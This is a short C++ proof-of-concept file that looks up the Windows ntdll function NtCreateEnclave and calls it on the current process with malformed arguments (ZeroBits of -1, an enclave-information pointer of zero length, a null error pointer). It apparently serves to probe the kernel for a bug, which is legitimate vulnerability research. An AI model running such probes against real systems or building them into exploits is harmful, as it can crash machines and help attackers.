// POC_NtCreateEnclave_SGX.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "windows.h"

#define ulong unsigned long
#define ulonglong unsigned long long

#define ENCLAVE_TYPE_SGX 0x00000001
#define ENCLAVE_TYPE_VBS 0x00000010


typedef ulonglong (*fNtCreateEnclave)(
HANDLE hProcess, 
ulonglong BaseAddress, 
ulonglong ZeroBits, 
ulonglong Size, 
ulonglong InitialCommitment, 
ulonglong EnclaveType, 
ulonglong EnclaveInformation, 
ulonglong EnclaveInformationLength, 
ulonglong pErrorStatus);

fNtCreateEnclave NtCreateEnclave = 0;


void POC_4()
{
	HMODULE hM = GetModuleHandle(L"ntdll.dll");
	NtCreateEnclave = (fNtCreateEnclave)GetProcAddress(hM,"NtCreateEnclave");
	printf("NtCreateEnclave at: %I64X\r\n",NtCreateEnclave);

	if(!NtCreateEnclave)
	{
		printf("OS not supported\r\n");
		ExitProcess(0);
	}



	ulonglong pAddress = (ulonglong)VirtualAlloc(0,0x10000,MEM_COMMIT,PAGE_READWRITE);
	ulonglong pStart = (ulonglong)VirtualAlloc(0,0x10000,MEM_COMMIT,PAGE_READWRITE);
	void* pSrc = (void*)VirtualAlloc(0,0x1000,MEM_COMMIT,PAGE_READWRITE);


	ulonglong ret = 0;
	ulonglong BaseAddress = 0;


		ulonglong Out0=0,Out1=0;

		
		ulong Err = 0;

		printf("Yes\r\n");
		ret = NtCreateEnclave(	GetCurrentProcess(),
										(ulonglong) (&BaseAddress),
										-1 /* ZeroBits */,
										0x2000 /* Size */,
										0x1000 /* InitialCommitment */,
										0x1 /* Type */,
										(ulonglong)pSrc /* EnclaveInformation */,
										0x0 /* EnclaveInformationLength */,
										0x0 /* pEnclaveError */);

	printf("NtCreateEnclave, ret: %I64X\r\n",ret);
	printf("BaseAddress: %I64X\r\n",BaseAddress);

	ExitProcess(0);
}


int _tmain(int argc, _TCHAR* argv[])
{
	HMODULE hM = GetModuleHandle(L"ntdll.dll");
	NtCreateEnclave = (fNtCreateEnclave)GetProcAddress(hM,"NtCreateEnclave");
	printf("NtCreateEnclave at: %I64X\r\n",NtCreateEnclave);


	if((!NtCreateEnclave))
	{
		printf("OS not supported\r\n");
		ExitProcess(0);
	}


	POC_4();
	return 0;
}

